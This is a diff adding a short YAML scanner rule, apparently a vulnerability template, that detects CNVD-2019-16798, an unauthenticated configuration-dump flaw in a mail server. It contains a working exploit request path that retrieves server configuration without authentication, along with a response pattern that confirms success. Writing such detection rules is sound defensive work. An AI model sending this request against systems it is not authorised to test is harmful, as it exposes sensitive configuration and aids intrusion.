@@ -1,0 +1,12 @@
+cve-id: CNVD-2019-16798
+rules:
+  - method: GET
+    path: >-
+      /mailsms/s?func=ADMIN:appState&dumpConfig=/
+    follow_redirects: false
+    expression: >
+      response.status == 200 && response.body.bcontains(b"<object name=\"cm_md_db\">")
+severity:
+  critical
+type: 
+  unauthaccess
